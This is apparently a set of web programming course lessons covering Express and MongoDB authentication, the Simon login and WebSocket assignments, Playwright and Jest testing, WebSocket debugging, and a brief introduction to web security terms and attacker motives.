const cookieParser = require('cookie-parser');
const express = require('express');
const app = express();

const userName = 'holowaychuk';
const password = 'express';
const hostname = 'mongodb.com';

const url = `mongodb+srv://${userName}:${password}@${hostname}`;
const client = new MongoClient(url);
const collection = client.db('authTest').collection('user');

app.use(cookieParser());
app.use(express.json());

// createAuthorization from the given credentials
app.post('/auth/create', async (req, res) => {
  if (await getUser(req.body.email)) {
    res.status(409).send({ msg: 'Existing user' });
  } else {
    const user = await createUser(req.body.email, req.body.password);
    setAuthCookie(res, user.token);
    res.send({
      id: user._id,
    });
  }
});

// loginAuthorization from the given credentials
app.post('/auth/login', async (req, res) => {
  const user = await getUser(req.body.email);
  if (user) {
    if (await bcrypt.compare(req.body.password, user.password)) {
      setAuthCookie(res, user.token);
      res.send({ id: user._id });
      return;
    }
  }
  res.status(401).send({ msg: 'Unauthorized' });
});

// getMe for the currently authenticated user
app.get('/user/me', async (req, res) => {
  authToken = req.cookies['token'];
  const user = await collection.findOne({ token: authToken });
  if (user) {
    res.send({ email: user.email });
    return;
  }
  res.status(401).send({ msg: 'Unauthorized' });
});

function getUser(email) {
  return collection.findOne({ email: email });
}

async function createUser(email, password) {
  const passwordHash = await bcrypt.hash(password, 10);
  const user = {
    email: email,
    password: passwordHash,
    token: uuid.v4(),
  };
  await collection.insertOne(user);

  return user;
}

function setAuthCookie(res, authToken) {
  res.cookie('token', authToken, {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
  });
}

const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});

Experiment
With everything implemented we can use curl to try it out. First start up the web service from VS Code by pressing F5 and selecting node.js as the debugger if you have not already done that. You can set breakpoints on all of the different endpoints to see what they do and inspect the different variables. Then open a console window and run the following curl commands. You should see similar results as what is shown below. Note that the -c and -b parameters tell curl to store and use cookies with the given file.
curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'

{"id":"639bb9d644416bf7278dde44"}

curl -c cookie.txt -X POST localhost:8080/auth/login -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'

{"id":"639bb9d644416bf7278dde44"}

curl -b cookie.txt localhost:8080/user/me

{"email":"지안@id.com"}

Simon login

This deliverable demonstrates using MongoDB to persistently store application data, and authenticating users.
You can view this application running here: Example Simon Login

Database support
This version of Simon calls the database service to save high scores and authorization tokens. This creates a third layer in our Simon technology stack.
Client application - Simple HTML/CSS/JavaScript
Web service - Caddy, Node.js, Express
Database service - MongoDB
Connecting to the database
We use a cloud service called MongoDB Atlas for our database service. Once we are connected to Atlas, we can make service calls to MongoDB from our web service. This involves specifying the database service endpoint and making database calls like the following.
const { MongoClient } = require('mongodb');

const url = `mongodb+srv://${userName}:${password}@${hostname}`;
const client = new MongoClient(url);
client.connect(err => {
  const collection = client.db("test").collection("devices");

  // ... perform actions on the DB collection

  client.close();
});


Create a MongoDB Atlas cluster
You need to get a MongoDB Atlas account and create a database cluster that you can use as your database service. If you have not done that yet, go back and review the instruction on data services.
Handling credentials
Make sure you follow the instruction given previously about providing and protecting your MongoDB credentials in a file named dbConfig.json. This file will get deployed to production with the deployService.sh script.
Working with the database
The database.js file contains the functions for getting and adding high scores. The database functions are called from the getScores and submitScores endpoints found in index.js.
Authorization
Authorization UI
The public/index.html, public/login.js, and public/login.css files provide all the login UI. Bootstrap provides the styling for the controls.
When index.html is loaded, an anonymous function in login.js determines if the user is already authenticated and uses that state to hide or show the login controls.
When a user logs in, logs out, or creates credentials the service endpoints are called.
Authorization cookie
The application service uses a secure cookie to store the authorization token for an authenticated user.
function setAuthCookie(res, authToken) {
  res.cookie(authCookieName, authToken, {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
  });
}

Note the use of secure, httpOnly, and sameSite. Make sure you are familiar with what each of these mean.
When a user is logged in, the cookie is added. When a user makes a secure request, the cookie is checked. When the user logs out, the cookie is removed.
Application service endpoints
The service endpoints are contained in index.js. The endpoints include authCreate, authLogin, authLogout, and userGet. These all work with the database to store and get credentials and update the authorization cookie.
A new Express router, secureApiRouter wraps the existing router to add a middleware function that verifies that the authorization cookie is valid before passing the request to endpoints that require authorization. That makes it easy to create secure endpoints by just registering them with secureApiRouter.
Study this code
Get familiar with what this code teaches.
Clone the repository to your development environment.
git clone https://github.com/webprogramming260/simon-login.git


Set up your Atlas credentials in a file named dbConfig.json that is in the same directory as database.js.
Add dbConfig.json to your .gitignore file so that it doesn't put your credentials into GitHub accidentally.
Review the code and get comfortable with everything it represents.
Debug the code in your browser by hosting it from a VS Code debug session. This video on debugging a node.js based service will step you through the process.
⚠ You will no longer use the live server extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in index.js. Set breakpoints in your backend code inside of Visual Studio.
See how data is populated in the database by viewing the contents of the database using the MongoDB Atlas console.
Make modifications to the code as desired. Experiment and see what happens.
Deploy to production
Deploy to your production environment using a copy of the deployService.sh script found in the example class application. Take some time to understand how it works.
./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
For example,
./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon


Update your startup repository notes.md with what you learned.
Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).

Startup Login
Now that you have learned how to use a database and authenticate users, it is time to add the ability to db and login to your startup application. The main things you should focus on in this deliverable include connecting to the database, creating endpoints that accept and return data, storing and retrieving data from the database, creating and accepting credentials for your user, validating and properly storing credentials in your database, and restricting functionality based on the user's authorized rights.
You must use the same startup GitHub repository that you created in the earlier instruction. Update the notes.md file with things that you learn as you work on your startup. As you make changes to your HTML, CSS, and JavaScript commit those changes and push them to GitHub. You will need at least ten commits to get full credit, but in reality you should have many more than that.
Remember to use the browser's debugger window to debug your frontend HTML, CSS and JavaScript. You can also debug your backend service JavaScript running on Node.js using the built in VS Code Node.js debugger.
Once you have developed your application to where you want it, you need to release it to your production environment. Use the deployService.sh script from the Simon Login repository and use startup for the service parameter (-s).
./deployService.sh -k <yourpemkey> -h <yourdomain> -s startup

For example,
./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s startup

Doing this will make this deliverable of your startup available from https://startup.yourdomainname.
☑ Assignment
Review and deploy Simon Login
Clone the Simon Login repository to your development environment.
Run npm install in root of the project.
Open the project in VS Code and examine the application's use of JavaScript to support database storage and user authentication.
Create and configure the dbConfig.json file with your MongoDB credentials.
Execute in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing index.js). Set breakpoints in VS Code and step through the backend JavaScript related to login interactions.
Open your browser to https://localhost:3000 and use the browser's dev tools to step through the frontend JavaScript using the Source tab.
Deploy to your production environment using the deployment script so that it is available with your domain's simon subdomain.
Add code for connecting to the database
Provide endpoints for adding, updating, and deleting your application data in the database
Persist data in MongoDB.
Display the user data in the frontend by manipulating the DOM.
Allow new users to create accounts by providing credentials
Store encrypted credentials in your database
Allow existing users to provide credentials
Authenticate users by comparing provided credentials against those stored in the database
Restrict access to parts of the application that require authorization
Debug your application using VS Code's Node debugger and the browser's dev tools, in your development environment to verify it is working correctly.
Periodically commit and push your code to GitHub.
Periodically update your startup repository's notes.md file to reflect what you have learned and want to remember.
Push your final version of your project to GitHub.
Deploy your startup application to your production environment (your server).
Make sure your application is available from your production environment.
Upload the URL to your startup application to the Canvas assignment.
Grading Rubric
Prerequisite: Simon Login deployed to your production environment with your dbConfig.json credentials
Prerequisite: A link to your GitHub startup repository prominently displayed on your application's home page
Prerequisite: Notes in your startup Git repository README.md file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the voter app as an example.
Prerequisite: At least 10 git commits spread consistently throughout the assignment period.
Application authentication and authorization
20% - Supports new user registration
20% - Supports existing user authentication
20% - Stores application data in MongoDB
20% - Stores and retrieves credentials in MongoDB
20% - Restricts application functionality based upon authentication
Go celebrate
You did it! This is a significant milestone. Time to grab some friends, show them what you did, and celebrate by making some pancakes 🥞.

UI testing
Test driven development (TDD) is a proven methodology for accelerating application creation, protecting against regression bugs, and demonstrating correctness. TDD for console based applications and server based code is fairly straight forward. Web application UI code is significantly more complex to test, and using automated tests to drive your UI development is even more difficult.
The problem is that a browser is required to execute UI code. That means you have to actually test the application in the browser. Additionally, every one of the major browsers behaves slightly differently, viewport size makes a big difference, all the code executes asynchronously, network disruptions are common, and then there is the human factor. A human will interact with the browser in very unexpected ways. Clicking where they shouldn't, clicking rapidly, randomly refreshing the browser, flushing cache, not flushing cache, leaving the application up for days on end, switching between tabs, opening the application multiple times, logging in on different tabs, logging out of one tab while still using the application on another tab, or ... on and on. And we haven't even talked about running all the different browsers on all of the possible devices.
Of course the alternative to not test your code doesn't work either. That only means that you have to manually test everything every time you make any change, or you let your users test everything. That is not a good recipe for long term success.
Fortunately this is a problem that many strong players have been working on for decades now, and the solutions, while not perfect, are getting better and better. We will look at two of these solutions. One is for executing automated tests in the browser, and the other is for testing on different browsers and devices.
Automating the browser - Playwright
📖 Deeper dive reading: Playwright and VS Code
No one understands the difficulty of testing applications in a browser better than the companies that build web browsers. They have to test every possible use of HTML, CSS, and JavaScript that a user could think of. There is no way that manual testing is going to work and so early on they started putting hooks into their browsers that allowed them to be driven from automated external processes. Selenium was introduced in 2004 as the first popular tool to automate the browser. However, Selenium is generally considered to be flaky and slow. Flakiness means that a test fails in unpredictable, unreproducible ways. When you need thousands of tests to pass before you can deploy a new feature, even a little flakiness becomes a big problem. If those tests take hours to run then you have an even bigger problem.
The market now has lots of alternatives when considering which automated browser framework to use. State of JS includes statistics on how popular these frameworks are. With frameworks coming and going all of the time, one telling statistic is the frameworks' ability to retain users.

— Retention of browser based testing frameworks (Source: 2021.stateofjs.com)
For the purposes of this instruction, we could pick any of the top contenders. However, we are going to pick a newcomer, Playwright. Playwright has some major advantages. It is backed by Microsoft, it integrates really well with VS Code, and it runs as a Node.js process. It is also considered one of the least flaky of the testing frameworks.
As a demonstration of using Playwright, consider the following simplified HTML file containing a button that changes the paragraph text. The button calls a JavaScript function defined in a script element located in the HTML file.
<body>
  <p id="welcome" data-testid="msg">Hello world</p>
  <button onclick="changeWelcome()">change welcome</button>
  <script>
    function changeWelcome() {
      const welcomeEl = document.querySelector('#welcome');
      welcomeEl.textContent = 'I feel welcomed';
    }
  </script>
</body>

First, you need to install Playwright. In your project directory, use NPM to download the Playwright packages, install the browser drivers, configure your project, and create a couple example test files.
npm init playwright@latest

Next, you want to install the Playwright extension for VS Code. Go to the extensions tab in VS Code and search for, and install, Playwright Test for VSCode.
You can now write your first Playwright test. Take the following and paste it over the tests/example.spec.js file that the Playwright install created.
import { test, expect } from '@playwright/test';

test('testWelcomeButton', async ({ page }) => {
  // Navigate to the welcome page
  await page.goto('http://localhost:5500/');

  // Get the target element and make sure it is in the correct starting state
  const hello = page.getByTestId('msg');
  await expect(hello).toHaveText('Hello world');

  // Press the button
  const changeBtn = page.getByRole('button', { name: 'change welcome' });
  await changeBtn.click();

  // Expect that the change happened correctly
  await expect(hello).toHaveText('I feel not welcomed');
});

This test makes sure you can successfully navigate to the desired page, that the page contains the desired elements, that you can press the button and the text changes as expected.
Before you run the test, you actually need your application running for the test to execute against. You can do this by using the VS Code Live Server extension, or if you are testing a Node.js based service then run npm run start. You can actually add configuration to your tests so that your application is started when your tests run, but for now, just start up your application before you run the test.
To run the test in VS Code, select the Test Explorer tab. You should see your test listed in the explorer. Select the example.spec.ts test and press the play button. This will start the test, launch a browser, run the test code to interact with the browser, and display the result. In this case our test fails because it is expecting the resulting text to be I feel not welcomed when it actually displays I feel welcomed.
The following image should be similar to what you see. You can see the listing of tests on the left and the JavaScript based test in the editor window on the right. When a test fails, the editor window displays a clear description of what went wrong. You can even debug the tests as they execute just like you would any other Node.js based JavaScript execution.

You can fix the test by either changing index.html or test/example.spec.js so that the text matches. Once you have done that you can run the test again and the test explorer should display a green check box.
This is just a simple example of the powerful functionality of Playwright. You are encouraged to explore its functionality and even add some tests to your projects. Once you have gained some competency with Playwright you will find that you can write your code faster and feel more confident when changing things around.
Testing various devices - BrowserStack
With the ability to run automated UI tests, we now turn our attention to testing on the multitude of various devices. There are several services out there that help with this. One of these is BrowserStack. BrowserStack lets you pick from a long list of physical devices that you can run interactively, or use when driving automated tests with Selenium. The image below only shows a partial list of iPhone devices. BrowserStack also has devices for Android, Mac, and Windows.

When you launch a device it connects the browser interface to a physical device hosted in a data center. You can then use the device to reproduce user reported problems, or validate that your implementation works on that specific device. The following image shows the use of BrowserStack to experiment with an iPhone 14 running iOS 16.

BrowserStack offers free trials if you would like to see how your startup application works on a specific device.

Endpoint testing
Using test driven development (TDD) for testing service endpoints is a common industry practice. Testing services is usually easier than writing UI tests because it does not require a browser. However, it does still take effort to learn how to write tests that are effective and efficient. Making this a standard part of your development process will give you a significant advantage as you progress in your professional career.
As demonstrated by the following State of JS survey, there are lots of good testing packages that work well with Express driven services. We are going to look at the current champion Jest.

To get started with Jest we need a simple web service. In a console window, create a test directory, install Express, and open up VS Code.
mkdir testJest
cd testJest
npm init -y
npm install express
code .

Now create a file named server.js and use Express to create an application with two endpoints: one to get a store (getStore), and another to update a store.
server.js
const express = require('express');
const app = express();

app.use(express.json());

// Endpoints
app.get('/store/:storeName', (req, res) => {
  res.send({ name: req.params.storeName });
});

app.put('/store/:storeName', (req, res) => {
  req.body.updated = true;
  res.send(req.body);
});

module.exports = app;

In order to allow Jest to start up the HTTP server when running tests, we initialize the application a little bit differently than we have in the past. Normally, we would have just started listening on the Express app object after we defined our endpoints. Instead we export the Express app object from our server.js file and then import the app object in the index.js file that is used to run our service.
index.js
const app = require('./server');

const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});

Breaking apart the definition of the service from the starting of the service allows us to start the service both when we run normally and also when using our testing framework.

You can test that the service is working properly by running the service in the VS Code debugger and pressing F5 while viewing the index.js file. Then open a browser and navigate to http://localhost:8080/store/provo. Stop the debugging session once you have demonstrated that the service is working correctly.
To launch the service using Jest we create another file that has a suffix of .test.js. Any file with that suffix is considered a testing file and will automatically be discovered by Jest and examined for tests to run.
A simple test
Before we write tests for our endpoints we will write a simple test that demonstrates how Jest works. A test is created by calling the Jest test function. Note that you don't need to include a require statement to import Jest functions into your code. Jest will automatically import itself when it discovers a test file.
Let's make our first test by creating a file named store.test.js and pasting in the following code.
store.test.js
test('that equal values are equal', () => {
  expect(false).toBe(true);
});

The test function takes a description as the first parameter. The description is meant to be human readable. In this case it reads: "test that equal values are equal". The second parameter is the function to call. Our function just calls the Jest expect function and chains it to the toBe function. You can read this as "expect false to be true", which of course is not true, but we want to see our test fail the first time we run it. We will fix this later so that we can show what happens when a test succeeds.
In order to run the test we need to install the Jest package using NPM. From the console install the package. The -D parameter tells NPM to install Jest as a development package. That keeps it from being included when we do production release builds.
npm install jest -D

Now, replace the scripts section of the package.json file with a new command that will run our tests with Jest.
"scripts": {
  "test": "jest"
},

With that in place we can run the test command and our test will execute. Notice that Jest shows exactly where the test failed and what expected values were not received.
➜ npm run test

 FAIL  ./store.test.js
  ✕ that unequal values are not equal (1 ms)

  ● that unequal values are not equal

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      3 |
      4 | test('that unequal values are not equal', () => {
    > 5 |   expect(false).toBe(true);
        |                 ^
      6 | });
      7 |
      8 | // describe('endpoints', () => {

      at Object.toBe (store.test.js:5:17)

Tests:       1 failed, 1 total

We can then fix our test by rewriting it so that the expected value matches the provided value.
store.test.js
test('that equal values are equal', () => {
  expect(true).toBe(true);
});

This time when we run the test it passes.
➜  npm run test

 PASS  ./store.test.js
  ✓ that equal values are equal (1 ms)

Tests:       1 passed, 1 total

Note that this example didn't actually test any of our code, but it does demonstrate how easy it is to write tests. A real test function would call code in your program. Let's do this by actually making calls to our endpoints.
Testing endpoints
To test our endpoints we need another package so that we can make HTTP requests without having to actually send them over the network. This is done with the NPM package called supertest. Go ahead and install this now.
npm install supertest -D

We can then alter store.test.js to import our Express service and also the request function from supertest that we will use to make HTTP requests.
To make an HTTP request you pass the Express app to the supertest request function and then chain on the HTTP verb function that you want to call, along with the endpoint path. You can then chain on as many expect functions as you would like. In the following example we will expect an HTTP status code of 200 (OK), and that the body of the response contains the object that we expect the endpoint to return.
If something goes wrong, the end function will contain an error and we pass the error along to the done function. Otherwise we just call done without the error.
store.test.js
const request = require('supertest');
const app = require('./server');

test('getStore returns the desired store', (done) => {
  request(app)
    .get('/store/provo')
    .expect(200)
    .expect({ name: 'provo' })
    .end((err) => (err ? done(err) : done()));
});

When we run this test we see that it passes without error.
➜  npm run test

 PASS  ./store.test.js
  ✓ getStore returns the desired store (16 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.237 s, estimated 1 s

You can change the test to expect a status code of 500 (Server Error) if you want to see the test fail. You can also change the endpoint code to return a 201 status code (Created) and also see the test fail.
Now we can add a test for the updateStore endpoint. To do this we can copy the getStore endpoint, change the description, change the HTTP function verb to put, and send the body of the put request using the chained send function.
const request = require('supertest');
const app = require('./server');

test('updateStore saves the correct values', (done) => {
  request(app)
    .put('/store/provo')
    .send({ items: ['fish', 'milk'] })
    .expect(200)
    .expect({ items: ['fish', 'milk'], updated: true })
    .end((err) => (err ? done(err) : done()));
});

test('getStore returns the desired store', (done) => {
  request(app)
    .get('/store/provo')
    .expect(200)
    .expect({ name: 'provo' })
    .end((err) => (err ? done(err) : done()));
});

The great thing about test driven development (TDD) is that you can actually write your tests first and then write your code based upon the design represented by the tests. When your tests pass you know your code is complete. Additionally, when you make later modifications to your code you can simply run your tests again. If they pass then you can be confident that your code is still working without having to manually test everything yourself. With systems that have hundreds of endpoints and hundreds of thousands of lines of code, TDD becomes an indispensable part of the development process.

WebSocket

HTTP is based on a client-server architecture. A client always initiates the request and the server responds. This is great if you are building a global document library connected by hyperlinks, but for many other use cases it just doesn't work. Applications for notifications, distributed task processing, peer-to-peer communication, or asynchronous events need communication that is initiated by two or more connected devices.
For years, web developers created hacks to work around the limitation of the client/server model. This included solutions like having the client frequently pinging the server to see if the server had anything to say, or keeping client-initiated connections open for a very long time as the client waited for some event to happen on the server. Needless to say, none of these solutions were elegant or efficient.
Finally, in 2011 the communication protocol WebSocket was created to solve this problem. The core feature of WebSocket is that it is fully duplexed. This means that after the initial connection is made from a client, using vanilla HTTP, and then upgraded by the server to a WebSocket connection, the relationship changes to a peer-to-peer connection where either party can efficiently send data at any time.

WebSocket connections are still only between two parties. So if you want to facilitate a conversation between a group of users, the server must act as the intermediary. Each peer first connects to the server, and then the server forwards messages amongst the peers.

Creating a WebSocket conversation
JavaScript running on a browser can initiate a WebSocket connection with the browser's WebSocket API. First you create a WebSocket object by specifying the port you want to communicate on.
You can then send messages with the send function, and register a callback using the onmessage function to receive messages.
const socket = new WebSocket('ws://localhost:9900');

socket.onmessage = (event) => {
  console.log('received: ', event.data);
};

socket.send('I am listening');

The server uses the ws package to create a WebSocketServer that is listening on the same port the browser is using. By specifying a port when you create the WebSocketServer, you are telling the server to listen for HTTP connections on that port and to automatically upgrade them to a WebSocket connection if the request has a connection: Upgrade header.
When a connection is detected it calls the server's on connection callback. The server can then send messages with the send function, and register a callback using the on message function to receive messages.
const { WebSocketServer } = require('ws');

const wss = new WebSocketServer({ port: 9900 });

wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    const msg = String.fromCharCode(...data);
    console.log('received: %s', msg);

    ws.send(`I heard you say "${msg}"`);
  });

  ws.send('Hello webSocket');
});

In a later instruction we will show you how to run and debug this example.

Debugging WebSocket
You can debug both sides of the WebSocket communication with VS Code to debug the server, and Chrome to debug the client. When you do this you will notice that Chrome's debugger has support specifically for working with WebSocket communication.

Debugging the server
Create a directory named testWebSocket and change to that directory.
Run npm init -y.
Run npm install ws.
Open VS Code and create a file named main.js. Paste the following code.
const { WebSocketServer } = require('ws');

const wss = new WebSocketServer({ port: 9900 });

wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    const msg = String.fromCharCode(...data);
    console.log('received: %s', msg);

    ws.send(`I heard you say "${msg}"`);
  });

  ws.send('Hello webSocket');
});


Set breakpoints on the ws.send lines so you can inspect the code executing.
Start debugging by pressing F5. The first time you may need to choose Node.js as the debugger.

Debugging the client
Open the Chrome debugger by pressing F12.
Paste this code into the debugger console window and press enter to execute it. Executing this code will immediately hit the server breakpoint. Take a look at what is going on and then remove the breakpoint from the server.
const socket = new WebSocket('ws://localhost:9900');

socket.onmessage = (event) => {
  console.log('received: ', event.data);
};


Select the Network tab and then select the HTTP message that was generated by the execution of the above client code.
With the HTTP message selected, you then click the Messages tab to view the WebSocket messages
Send a message to the server by executing the following in the debugger console window. This will cause the second server breakpoint to hit. Explore and then remove the breakpoint from the server.
socket.send('I am listening');


You should see the messages in the Messages debugger window.
Send some more messages and observe the communication back and forth without stopping on the breakpoints.

Debugging WebSocket
You can debug both sides of the WebSocket communication with VS Code to debug the server, and Chrome to debug the client. When you do this you will notice that Chrome's debugger has support specifically for working with WebSocket communication.

Debugging the server
Create a directory named testWebSocket and change to that directory.
Run npm init -y.
Run npm install ws.
Open VS Code and create a file named main.js. Paste the following code.
const { WebSocketServer } = require('ws');

const wss = new WebSocketServer({ port: 9900 });

wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    const msg = String.fromCharCode(...data);
    console.log('received: %s', msg);

    ws.send(`I heard you say "${msg}"`);
  });

  ws.send('Hello webSocket');
});


Set breakpoints on the ws.send lines so you can inspect the code executing.
Start debugging by pressing F5. The first time you may need to choose Node.js as the debugger.

Debugging the client
Open the Chrome debugger by pressing F12.
Paste this code into the debugger console window and press enter to execute it. Executing this code will immediately hit the server breakpoint. Take a look at what is going on and then remove the breakpoint from the server.
const socket = new WebSocket('ws://localhost:9900');

socket.onmessage = (event) => {
  console.log('received: ', event.data);
};


Select the Network tab and then select the HTTP message that was generated by the execution of the above client code.
With the HTTP message selected, you then click the Messages tab to view the WebSocket messages
Send a message to the server by executing the following in the debugger console window. This will cause the second server breakpoint to hit. Explore and then remove the breakpoint from the server.
socket.send('I am listening');


You should see the messages in the Messages debugger window.
Send some more messages and observe the communication back and forth without stopping on the breakpoints.

Simon WebSocket
🎥 Instruction video: Simon WebSocket

This deliverable demonstrates peer-to-peer communication using WebSocket. The functionality that Simon provides for peer communication is intentionally limited to display notifications between users. This was done so that the application would clearly demonstrate how WebSocket works rather than clutter the application with functionality that uses WebSockets.
You can view this application running here: Example Simon WebSocket
Handling WebSocket requests
After installing the ws NPM package the next step is to attach a WebSocket listener to the HTTP server that was created in an earlier deliverable. This work is all done in the PeerProxy class implemented in the peerProxy.js file. The PeerProxy class contains the protocol upgrade from HTTP to WebSocket, tracks new WebSocket connections, passes (or proxies) requests between connections, and implements ping/pong to keep connections alive.
Displaying and generating WebSocket messages
The public/play.js file contains the functions for connecting, broadcasting, receiving, and displaying events using WebSocket.

Leveraging the concepts demonstrated in this deliverable, you can implement additional functionality that uses peer-to-peer interactions. For example, you could make it so each connected peer has to complete one of the Simon patterns in turn.
Study this code
Get familiar with what this code teaches.
Clone the repository to your development environment.
git clone https://github.com/webprogramming260/simon-websocket.git


Set up your Atlas credentials in a file named dbConfig.json that is in the same directory as database.js.
Add dbConfig.json to your .gitignore file so that it doesn't put your credentials into GitHub accidentally.
Review the code and get comfortable with everything it represents.
Debug the code in your browser by hosting it from a VS Code debug session. This video on debugging a node.js based service will step you through the process.
⚠ You will no longer use the live server extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in index.js. Set breakpoints in your backend code inside of Visual Studio.
Use the browser's dev tools to set breakpoints in the code and step through it each line.
Make modifications to the code as desired. Experiment and see what happens.
Deploy to production
Deploy to your production environment using a copy of the deployService.sh script found in the example class application. Take some time to understand how it works.
./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
For example,
./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon


Update your startup repository notes.md with what you learned.
Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
Startup WebSocket
Now that you have learned how to use WebSocket network connections, it is time to add it to your startup application. The main things you should focus on in this deliverable include listening for a connection on your backend, making a connection from your frontend, sending messages between the two, and displaying the result in your application.
You must use the same startup GitHub repository that you created in the earlier instruction. Update the notes.md file with things that you learn as you work on your startup. As you make changes to your HTML, CSS, and JavaScript commit those changes and push them to GitHub. You will need at least ten commits to get full credit, but in reality you should have many more than that.
Remember to use the browser's debugger window to debug your frontend HTML, CSS and JavaScript. You can also debug your backend service JavaScript running on Node.js using the built in VS Code Node.js debugger.
Once you have developed your application to where you want it, you need to release it to your production environment. Usethe deployService.sh script from the Simon WebSocket repository and use startup for the service parameter (-s).
./deployService.sh -k <yourpemkey> -h <yourdomain> -s startup

For example,
./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s startup

Doing this will make this deliverable of your startup available from https://startup.yourdomainname.
☑ Assignment
Review and deploy Simon WebSocket
Clone the Simon WebSocket repository to your development environment.
Run npm install in root of the project.
Open the project in VS Code and examine the application's use of JavaScript to support WebSocket communication.
Create and configure the dbConfig.json file with your MongoDB credentials.
Execute in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing index.js). Set breakpoints in VS Code and step through the backend JavaScript related to WebSocket communication.
Open your browser to https://localhost:3000 and use the browser's dev tools to step through the frontend JavaScript using the Source tab.
Deploy to your production environment using the deployment script so that it is available with your domain's simon subdomain.
Listen for WebSocket requests on your backend.
Connect the WebSocket from your frontend.
Send messages over your WebSocket connection.
Connect your WebSocket functionality to your application interface.
Make sure your name is displayed in the application and that there is a link to your GitHub repository.
Periodically commit and push your code to GitHub.
Periodically update your startup repository's notes.md file to reflect what you have learned and want to remember.
Push your final version of your project to GitHub.
Deploy your startup application to your production environment (your server).
Make sure your application is available from your production environment.
Upload the URL to your startup application to the Canvas assignment.
Grading Rubric
Prerequisite: Simon WebSocket deployed to your production environment
Prerequisite: A link to your GitHub startup repository prominently displayed on your application's home page
Prerequisite: Notes in your startup Git repository README.md file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the voter app as an example.
Prerequisite: At least 10 git commits spread consistently throughout the assignment period.
WebSocket support for data pushed from the backend
20% - Backend listens for WebSocket connection
20% - Frontend makes WebSocket connection
30% - Data sent over WebSocket connection
30% - WebSocket data displayed in the application interface
Go celebrate
You did it! This is a significant milestone. Time to grab some friends, show them what you did, and celebrate by eating some cheese 
Security overview
📖 Deeper dive reading:
Database of publicized software vulnerabilities
SQL Injection
The internet allows us to socially connect, conduct financial transactions, and provide access to sensitive individual, corporate, and government data. It is also accessible from every corner of the planet. This positions the internet as a tool that can make the world a much better place, but it also makes a very attractive target for those who would seek to do harm. Preventing that potential for harm needs to be in the forefront of you mind whenever you create or use a web application.
You can see bad actors at work on your very own server by using ssh to open a console to your server and reviewing the authorization log. The authorization log captures all of the attempts to create a session on your server.
sudo less +G /var/log/auth.log

The last entry in the log will be from your connection to the server.
Feb 23 16:26:54 sshd[319071]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)
Feb 23 16:26:54 systemd-logind[480]: New session 1350 of user ubuntu.
Feb 23 16:26:54 systemd: pam_unix(systemd-user:session): session opened for user ubuntu(uid=1000) by (uid=0)

However, you will see lots of other attempts with specific user names associated with common exploits. These all should be failing to connect, but if your server is not configured properly then an unauthorized access is possible. The sample of attempts below show the IP addresses of the attacker, as well as the user name that they used. Using the whois utility we can see that these attacks are originating from servers at DLive.kr in Korea, and DigitalOcean.com in the USA.
Feb 19 02:34:28 sshd[298185]: Invalid user developer from 27.1.253.142
Feb 19 02:37:12 sshd[298193]: Invalid user minecraft1 from 27.1.253.142
Feb 23 14:26:19 sshd[318868]: Invalid user siteadmin 174.138.72.191
Feb 23 14:22:18 sshd[318845]: Invalid user tester 174.138.72.191

As an experiment, one of our TAs created a test server with a user named admin with password password. Within 15 minutes, an attacker had logged in, bypassed all the restrictions that were in place, and started using the server to attack other servers on the internet.
Even if you don't think your application is valuable enough to require security, you need to consider that you might be creating a security problem for your users on other systems. For example, think about a simple game application where a user is required to provides a username and password in order to play the game. If the application's data is then compromised, then an attacker could use the password, used for the game application, to gain access to other websites where the user might have used the same password. For example, their social networking sites, work account, or financial institution.
Security terminology
Web application security, sometimes called AppSec, is a subset of cybersecurity that specifically focuses on preventing security vulnerabilities within end-user applications. Web application security involves securing the frontend code running on the user's device and also the backend code running on the web server.
Here is a list of common phrases used by the security community that you should be familiar with.
Hacking - The process of making a system do something it's not supposed to do.
Exploit - Code or input that takes advantage of a programming or configuration flaw.
Attack Vector - The method that a hacker employs to penetrate and exploit a system.
Attack Surface - The exposed parts of a system that an attacker can access. For example, open ports (22, 443, 80), service endpoints, or user accounts.
Attack Payload - The actual code, or data, that a hacker delivers to a system in order to exploit it.
Input sanitization - "Cleaning" any input of potentially malicious data.
Black box testing - Testing an application without knowledge of the internals of the application.
White box testing - Testing an application by with knowledge of the source code and internal infrastructure.
Penetration Testing - Attempting to gain access to, or exploit, a system in ways that are not anticipated by the developers.
Mitigation - The action taken to remove, or reduce, a threat.
Motivation for attackers
The following lists some common motivations at drives a system attack.
Disruption - By overloading a system, encrypting essential data, or deleting critical infrastructure, an attacker can destroy normal business operations. This may be an attempt at extortion, or simply be an attempt to punish a business that that attacker does not agree with.
Data exfiltration - By privately extracting, or publicly exposing, a system's data, an attacker can embarrass the company, exploit insider information, sell the information to competitors, or leverage the information for additional attacks.
Resource consumption - By taking control of a company's computing resources an attacker can use it for other purposes such as mining cryptocurrency, gathering customer information, or attacking other systems.
Examples of security failures
Security should always be a primary objective of any application. Building a web application that looks good and performs well, is a lot less important than building an application that is secure.
Here are a few examples where companies failed to properly prevent attacks to their systems.
$100 million dollars stolen through insider trading using SQL injection vulnerability
